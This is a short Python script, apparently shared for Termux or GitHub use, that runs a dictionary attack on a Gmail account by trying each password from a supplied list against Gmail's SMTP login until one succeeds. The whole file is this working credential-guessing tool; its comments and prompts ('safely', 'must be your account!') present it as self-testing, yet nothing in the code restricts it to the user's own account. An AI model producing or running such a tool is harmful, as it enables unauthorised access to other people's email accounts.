#!/usr/bin/env python3
import smtplib
import time
import os

# Cosmetic animation for console
def animate(text):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(0.01)
    print()

# Connect to Gmail SMTP server
def start_smtp():
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    return server

# Test password list safely
def test_passwords(account, password_file_path):
    if not os.path.isfile(password_file_path):
        print(f"[❌ ERROR] Password file '{password_file_path}' not found.")
        return

    server = start_smtp()
    try:
        with open(password_file_path, 'r') as f:
            for password in f:
                password = password.strip()
                if not password:
                    continue
                try:
                    # Only works with App Passwords
                    server.login(account, password)
                    animate(f"[✅ SUCCESS] Password works (App Password!): {password}")
                    break
                except smtplib.SMTPAuthenticationError:
                    animate(f"[❌ FAIL] Wrong password: {password}")
                except Exception as e:
                    animate(f"[⚠️ ERROR] {e}")
    finally:
        server.quit()

# ===========================
# Termux / GitHub Safe Configuration
# ===========================
dummy_account = input("Enter your Gmail address (must be your account!): ").strip()
password_file_path = input("Enter full path to your password list file: ").strip()

# Run the test
test_passwords(dummy_account, password_file_path)
